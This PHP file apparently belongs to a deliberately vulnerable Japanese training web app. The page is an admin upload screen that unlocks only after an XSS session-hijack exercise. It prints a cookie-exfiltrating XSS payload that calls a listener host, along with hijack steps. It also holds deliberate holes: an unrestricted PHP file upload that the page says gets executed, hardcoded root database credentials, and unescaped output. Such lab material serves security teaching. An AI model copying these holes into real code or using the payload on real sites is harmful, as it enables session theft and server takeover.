<?php

if (session_status() === PHP_SESSION_NONE) {
    session_start();
}


if (!isset($_SESSION['user_id']) || $_SESSION['role'] !== 'admin') {
    header('Location: login.php?error=access_denied&from=upload');
    exit;
}


$host = 'db';
$dbname = 'security_exercise';
$username = 'root';
$password = 'password';

try {
    $pdo = new PDO("mysql:host=$host;dbname=$dbname", $username, $password);
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
} catch(PDOException $e) {
    die("データベース接続エラー: " . $e->getMessage());
}


require_once 'xss_validation.php';
$validator = new XSSRouteValidator($pdo);

$message = '';
$error = '';
$authenticated = false;


if (isset($_POST['special_auth'])) {
    $entered_code = $_POST['auth_code'] ?? '';

    if ($validator->validateLegitimateAttack(session_id())) {

        $_SESSION['upload_authenticated'] = true;
        $_SESSION['auth_time'] = time();
        $_SESSION['auth_method'] = 'legitimate_xss';
        $_SESSION['xss_attack_verified'] = true;
        $authenticated = true;
        $message = "🎯 <strong>正規XSS攻撃ルートが検証されました！</strong><br>";
        $message .= "お問い合わせフォーム → XSSペイロード → 管理者メール確認 → セッションハイジャック<br>";
        $message .= "の正しい手順が確認できました。特権機能が解除されます。";
    } else {

        $stats = $validator->getAttackStatistics();
        $error = "認証に失敗しました。<br>";
        $error .= "<strong>正規のXSS攻撃ルートを完了してください：</strong><br>";
        $error .= "1. <a href='contact.php' target='_blank'>お問い合わせフォーム</a>でXSSペイロードを送信<br>";
        $error .= "2. 管理者でログインして<a href='dashboard.php' target='_blank'>ダッシュボード</a>でメール開封<br>";
        $error .= "3. XSSが実行されてセッションハイジャックが検出される<br>";
        $error .= "4. この画面で任意のコードを入力する<br><br>";
        $error .= "<small>統計: 正規攻撃{$stats['legitimate_attacks']}回 / 総試行{$stats['total_attempts']}回</small>";
    }
}


if (isset($_SESSION['upload_authenticated'])) {

    if (time() - ($_SESSION['auth_time'] ?? 0) < 600) {
        $authenticated = true;
    } else {
        unset($_SESSION['upload_authenticated']);
        unset($_SESSION['auth_time']);
        unset($_SESSION['auth_method']);
        unset($_SESSION['xss_attack_verified']);
        $error = "認証の有効期限が切れました。再度認証してください。";
    }
}

if ($authenticated && $_POST && isset($_POST['upload_file'])) {
    if (isset($_FILES['custom_file']) && $_FILES['custom_file']['error'] === UPLOAD_ERR_OK) {
        $uploadDir = 'uploads/';
        $originalName = $_FILES['custom_file']['name'];
        $fileName = $originalName;
        $filePath = $uploadDir . $fileName;
        

        if (!is_dir($uploadDir)) {
            mkdir($uploadDir, 0755, true);
        }
        

        if (move_uploaded_file($_FILES['custom_file']['tmp_name'], $filePath)) {
            $stmt = $pdo->prepare("INSERT INTO uploaded_files (filename, original_name, file_path, uploaded_by, is_active) VALUES (?, ?, ?, ?, ?)");
            $stmt->execute([$fileName, $originalName, $filePath, $_SESSION['user_id'], 1]);
            $message = "ファイルがアップロードされ、機能として有効化されました。";
        } else {
            $error = "ファイルアップロードに失敗しました。";
        }
    }
}


$uploadedFiles = [];
$stmt = $pdo->prepare("SELECT * FROM uploaded_files ORDER BY created_at DESC");
$stmt->execute();
$uploadedFiles = $stmt->fetchAll();


$login_method = $_SESSION['login_method'] ?? 'unknown';
$is_hijacked = ($login_method === 'hijacked');


$isLegitimate = $validator->validateLegitimateAttack(session_id());
$stats = $validator->getAttackStatistics();
?>

<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ファイルアップロード - ABC Corporation</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Arial', sans-serif; line-height: 1.6; color: #333; background: #f8f9fa; }
        .header { background: #2c3e50; color: white; padding: 1rem 0; }
        .container { max-width: 1200px; margin: 0 auto; padding: 0 20px; }
        .nav { display: flex; justify-content: space-between; align-items: center; }
        .nav h1 { font-size: 1.8rem; }
        .nav ul { display: flex; list-style: none; gap: 20px; }
        .nav a { color: white; text-decoration: none; padding: 10px 15px; border-radius: 5px; transition: background 0.3s; }
        .nav a:hover { background: #34495e; }
        .main { padding: 40px 0; }
        .upload-container { background: white; border-radius: 10px; box-shadow: 0 5px 15px rgba(0,0,0,0.1); overflow: hidden; margin-bottom: 30px; }
        .upload-header { background: #667eea; color: white; padding: 20px; }
        .auth-panel { padding: 30px; background: #fff3cd; border-bottom: 2px solid #ffeaa7; }
        .form-group { margin-bottom: 20px; }
        .form-group label { display: block; margin-bottom: 5px; font-weight: bold; color: #555; }
        .form-group input, .form-group select { width: 100%; padding: 12px; border: 2px solid #ddd; border-radius: 5px; font-size: 16px; }
        .btn { background: #667eea; color: white; padding: 12px 24px; border: none; border-radius: 5px; cursor: pointer; font-size: 16px; }
        .btn:hover { background: #5a67d8; }
        .btn-danger { background: #e74c3c; }
        .btn-danger:hover { background: #c0392b; }
        .btn-success { background: #28a745; }
        .btn-success:hover { background: #218838; }
        .message { padding: 15px; border-radius: 5px; margin-bottom: 20px; }
        .message.success { background: #d4edda; color: #155724; border: 1px solid #c3e6cb; }
        .message.error { background: #f8d7da; color: #721c24; border: 1px solid #f5c6cb; }
        .file-item { background: #f8f9fa; padding: 15px; margin-bottom: 10px; border-radius: 5px; display: flex; justify-content: space-between; align-items: center; }
        .admin-warning { background: #dc3545; color: white; padding: 15px; text-align: center; margin-bottom: 20px; }
        .hijacked-warning { background: #ff6b6b; color: white; padding: 20px; border-radius: 10px; margin-bottom: 20px; animation: pulse 2s infinite; }
        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.8; } }
        .login-method-info { background: #e9ecef; padding: 15px; border-radius: 5px; margin-bottom: 20px; }
        .legitimate-attack { background: #d4edda; border: 2px solid #28a745; color: #155724; }
        .manual-attack { background: #fff3cd; border: 2px solid #ffc107; color: #856404; }
        .attack-stats { background: #e9ecef; padding: 15px; border-radius: 5px; margin: 15px 0; }
        .xss-instructions { background: #f8f9fa; padding: 20px; border-radius: 5px; margin: 15px 0; border-left: 4px solid #007bff; }
        .access-denied { background: #f8d7da; color: #721c24; padding: 20px; border-radius: 5px; margin: 20px 0; border: 2px solid #dc3545; }
    </style>
</head>
<body>
    <header class="header">
        <div class="container">
            <nav class="nav">
                <h1>ABC Corporation</h1>
                <ul>
                    <li><a href="index.php">ホーム</a></li>
                    <li><a href="dashboard.php">ダッシュボード</a></li>
                    <li><a href="logout.php">ログアウト</a></li>
                </ul>
            </nav>
        </div>
    </header>

    <main class="main">
        <div class="container">

            <?php if ($is_hijacked): ?>
                <div class="hijacked-warning">
                    <h3>⚠️ セッションハイジャック検出！</h3>
                    <p>このセッションは不正な方法で取得された可能性があります。</p>
                    <p>通常のログイン手順を経ていないセッションでアクセスしています。</p>
                </div>
            <?php endif; ?>

            <div class="login-method-info">
                <h3>現在のセッション情報</h3>
                <p><strong>ユーザー:</strong> <?php echo htmlspecialchars($_SESSION['username']); ?></p>
                <p><strong>権限:</strong> <?php echo htmlspecialchars($_SESSION['role']); ?></p>
                <p><strong>ログイン方法:</strong> 
                    <span style="color: <?php echo $is_hijacked ? '#dc3545' : '#28a745'; ?>;">
                        <?php echo $is_hijacked ? 'セッションハイジャック' : '正規ログイン'; ?>
                    </span>
                </p>
                <p><strong>セッションID:</strong> <?php echo substr(session_id(), 0, 20); ?>...</p>
                <p><strong>XSS攻撃ルート:</strong> 
                    <span style="color: <?php echo $isLegitimate ? '#28a745' : '#dc3545'; ?>;">
                        <?php echo $isLegitimate ? '正規ルート完了' : '未完了'; ?>
                    </span>
                </p>
            </div>


            <div class="attack-stats">
                <h3>📊 攻撃統計</h3>
                <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; margin-top: 10px;">
                    <div style="background: white; padding: 15px; border-radius: 5px;">
                        <strong>総攻撃試行:</strong> <?php echo $stats['total_attempts']; ?>回
                    </div>
                    <div style="background: white; padding: 15px; border-radius: 5px;">
                        <strong>正規XSS攻撃:</strong> <?php echo $stats['legitimate_attacks']; ?>回
                    </div>
                    <div style="background: white; padding: 15px; border-radius: 5px;">
                        <strong>XSSペイロード送信:</strong> <?php echo $stats['xss_payloads_sent']; ?>回
                    </div>
                    <div style="background: white; padding: 15px; border-radius: 5px;">
                        <strong>メール開封:</strong> <?php echo $stats['emails_opened']; ?>回
                    </div>
                </div>
            </div>

            <div class="upload-container">
                <div class="upload-header">
                    <h2>📁 セキュアファイルアップロード</h2>
                    <p>管理者専用 - 正規XSS攻撃ルート必須</p>
                </div>

                <?php if (!$authenticated): ?>
                    <div class="auth-panel">
                        <h3>正規XSS攻撃ルート認証</h3>
                        
                        <?php if ($isLegitimate): ?>
                            <div class="message legitimate-attack">
                                <h4>🎯 正規XSS攻撃が検出されました！</h4>
                                <p>お問い合わせフォーム経由のXSS攻撃が正常に実行されています。</p>
                                <p><strong>任意のコードを入力してアクセスしてください。</strong></p>
                                <div style="margin-top: 15px;">
                                    <strong>完了した攻撃手順:</strong>
                                    <ol style="margin: 10px 0; padding-left: 20px;">
                                        <li>お問い合わせフォームでXSSペイロード送信 ✅</li>
                                        <li>管理者権限でメール確認画面にアクセス ✅</li>
                                        <li>XSS実行によるセッション情報窃取 ✅</li>
                                        <li>セッションハイジャックの成功 ✅</li>
                                    </ol>
                                </div>
                            </div>
                        <?php else: ?>
                            <div class="access-denied">
                                <h4>❌ アクセス拒否</h4>
                                <p><strong>この機能は正規XSS攻撃ルートを完了した場合のみ利用可能です。</strong></p>
                                <p>手動でのCookie差し替えや固定認証コードでは利用できません。</p>
                            </div>
                            
                            <div class="xss-instructions">
                                <h4>🔍 必須：正規XSS攻撃手順</h4>
                                <ol style="margin: 10px 0; padding-left: 20px; line-height: 1.8;">
                                    <li><a href="contact.php" target="_blank" style="color: #007bff;">お問い合わせフォーム</a>でXSSペイロードを送信
                                        <div style="background: #f8f9fa; padding: 10px; margin: 5px 0; border-radius: 3px; font-family: monospace; font-size: 0.9em;">
                                            &lt;img src=x onerror="fetch('http://localhost:8080/?cookie='+document.cookie)"&gt;
                                        </div>
                                    </li>
                                    <li>adminでログインして<a href="dashboard.php" target="_blank" style="color: #007bff;">ダッシュボード</a>でメール開封</li>
                                    <li>XSSが自動実行されてセッション情報が攻撃者サイトに送信される</li>
                                    <li>別ウィンドウでuser1ログイン → DevToolsでadminのCookieに変更</li>
                                    <li>この画面に戻って任意のコードで認証</li>
                                </ol>
                                
                                <div style="background: #e8f4f8; padding: 15px; border-radius: 5px; margin-top: 15px;">
                                    <strong>重要:</strong> 正規のXSS攻撃フローを完了しないと、この機能は一切利用できません。<br>
                                    セキュリティ演習の目的上、手動的な方法は無効化されています。
                                </div>
                            </div>
                        <?php endif; ?>

                        <?php if ($error): ?>
                            <div class="message error"><?php echo $error; ?></div>
                        <?php endif; ?>

                        <?php if ($isLegitimate): ?>
                        <form method="POST">
                            <div class="form-group">
                                <label for="auth_code">認証コード（任意）:</label>
                                <input type="text" id="auth_code" name="auth_code" required 
                                       placeholder="任意のコードを入力してください">
                            </div>
                            <button type="submit" name="special_auth" class="btn btn-success">
                                🎯 正規XSS攻撃認証
                            </button>
                        </form>
                        <?php else: ?>
                        <div style="text-align: center; margin: 20px 0;">
                            <a href="contact.php" class="btn" style="text-decoration: none;">お問い合わせフォームへ</a>
                            <a href="dashboard.php" class="btn" style="text-decoration: none;">ダッシュボードへ</a>
                        </div>
                        <?php endif; ?>
                    </div>
                <?php else: ?>
                    <div style="padding: 30px;">
                        <?php if ($message): ?>
                            <div class="message success"><?php echo $message; ?></div>
                        <?php endif; ?>

                        <?php if ($error): ?>
                            <div class="message error"><?php echo htmlspecialchars($error); ?></div>
                        <?php endif; ?>

                        <div class="message success legitimate-attack">
                            <h4>✅ 正規XSS攻撃ルート検証済み</h4>
                            <p>完全なセキュリティ演習が実行されました：</p>
                            <ol style="margin: 10px 0; padding-left: 20px;">
                                <li>お問い合わせフォームでのXSSペイロード送信 ✅</li>
                                <li>管理者権限でのメール確認 ✅</li>
                                <li>XSS実行によるセッション情報窃取 ✅</li>
                                <li>セッションハイジャックの成功 ✅</li>
                            </ol>
                            <p><strong>この方法が実際のセキュリティ攻撃手法です。</strong></p>
                        </div>

                        <div class="message success">
                            ✅ 特別認証済み - ファイルアップロード機能が有効です
                            （有効期限: <?php echo date('H:i:s', $_SESSION['auth_time'] + 600); ?>まで）
                        </div>

                        <div style="background: #f8f9fa; padding: 20px; border-radius: 5px; margin-bottom: 20px;">
                            <h3>PHPファイルアップロード:</h3>
                            <form method="POST" enctype="multipart/form-data">
                                <div class="form-group">
                                    <label>PHPファイルを選択:</label>
                                    <input type="file" name="custom_file" accept=".php,.txt" required>
                                    <small style="color: #666;">PHPファイルをアップロードするとログインページで実行されます</small>
                                </div>
                                <button type="submit" name="upload_file" class="btn">アップロード</button>
                            </form>
                        </div>

                        <h3>アップロード済みファイル:</h3>
                        <?php if (empty($uploadedFiles)): ?>
                            <p style="color: #666;">アップロードされたファイルはありません</p>
                        <?php else: ?>
                            <?php foreach($uploadedFiles as $file): ?>
                                <div class="file-item">
                                    <div>
                                        <strong><?php echo htmlspecialchars($file['original_name']); ?></strong><br>
                                        <small style="color: #666;">
                                            状態: <?php echo $file['is_active'] ? '有効' : '無効'; ?> | 
                                            <?php echo $file['created_at']; ?>
                                        </small>
                                    </div>
                                </div>
                            <?php endforeach; ?>
                        <?php endif; ?>

                        <div style="margin-top: 30px;">
                            <a href="dashboard.php" class="btn">ダッシュボードに戻る</a>
                            <button onclick="clearAuth()" class="btn btn-danger">認証をクリア</button>
                        </div>
                    </div>
                <?php endif; ?>
            </div>
        </div>
    </main>

    <script>
        console.log('=== 正規XSS攻撃ルート専用システム ===');
        console.log('ユーザー: <?php echo $_SESSION['username']; ?>');
        console.log('権限: <?php echo $_SESSION['role']; ?>');
        console.log('ログイン方法: <?php echo $login_method; ?>');
        console.log('正規攻撃ルート: <?php echo $isLegitimate ? "完了" : "未完了"; ?>');
        console.log('攻撃統計: 正規<?php echo $stats['legitimate_attacks']; ?>回 / 総<?php echo $stats['total_attempts']; ?>回');
        console.log('=====================================');

        <?php if ($isLegitimate): ?>
        console.log('%c🎯 正規XSS攻撃ルートが検証されました！', 'color: #28a745; font-weight: bold; font-size: 16px; background: #d4edda; padding: 5px;');
        console.log('%c完全なセキュリティ演習が完了しています', 'color: #155724; font-weight: bold;');
        <?php else: ?>
        console.log('%c❌ 正規攻撃ルートが未完了です', 'color: #721c24; font-weight: bold; font-size: 16px; background: #f8d7da; padding: 5px;');
        console.log('%cXSS攻撃の正しい手順を実行してください', 'color: #721c24; font-weight: bold;');
        console.log('%c手動的なCookie差し替えは無効化されています', 'color: #856404; font-weight: bold;');
        <?php endif; ?>


        function clearAuth() {
            if (confirm('認証をクリアしますか？')) {
                window.location.href = 'upload.php?clear_auth=1';
            }
        }


        <?php if ($isLegitimate): ?>
        window.addEventListener('load', function() {
            console.log('%c正規XSS攻撃経由で特権機能にアクセス中...', 'background: #28a745; color: white; padding: 10px; font-size: 14px;');
            

            setTimeout(function() {
                console.log('🎯 正規XSS攻撃完了 - 特権機能解除');
                
                var attackData = {
                    action: 'legitimate_xss_upload_access',
                    user: '<?php echo $_SESSION['username']; ?>',
                    role: '<?php echo $_SESSION['role']; ?>',
                    sessionId: '<?php echo session_id(); ?>',
                    timestamp: new Date().toISOString(),
                    attack_type: 'legitimate_xss_only',
                    success: true
                };
                
                var attackUrl = 'http://localhost:8080?' + Object.keys(attackData).map(key => 
                    key + '=' + encodeURIComponent(attackData[key])
                ).join('&');
                
                var img = new Image();
                img.src = attackUrl;
                
                console.log('✅ 正規XSS攻撃完了通知を送信');
            }, 2000);
        });
        <?php endif; ?>


        var forms = document.querySelectorAll('form');
        forms.forEach(function(form) {
            form.addEventListener('submit', function(e) {
                var fileInput = form.querySelector('input[type="file"]');
                if (fileInput && fileInput.files.length > 0) {
                    console.log('%c正規XSS攻撃ファイルアップロード実行中...', 'color: #28a745; font-weight: bold;');
                    console.log('ファイル名: ' + fileInput.files[0].name);
                    console.log('攻撃タイプ: 正規XSS攻撃のみ');
                    

                    document.body.style.border = '5px solid #28a745';
                    document.body.style.boxShadow = '0 0 20px #28a745';
                }
            });
        });
    </script>
</body>
</html>

<?php

if (isset($_GET['clear_auth'])) {
    unset($_SESSION['upload_authenticated']);
    unset($_SESSION['auth_time']);
    unset($_SESSION['auth_method']);
    unset($_SESSION['xss_attack_verified']);
    header('Location: upload.php');
    exit;
}
?>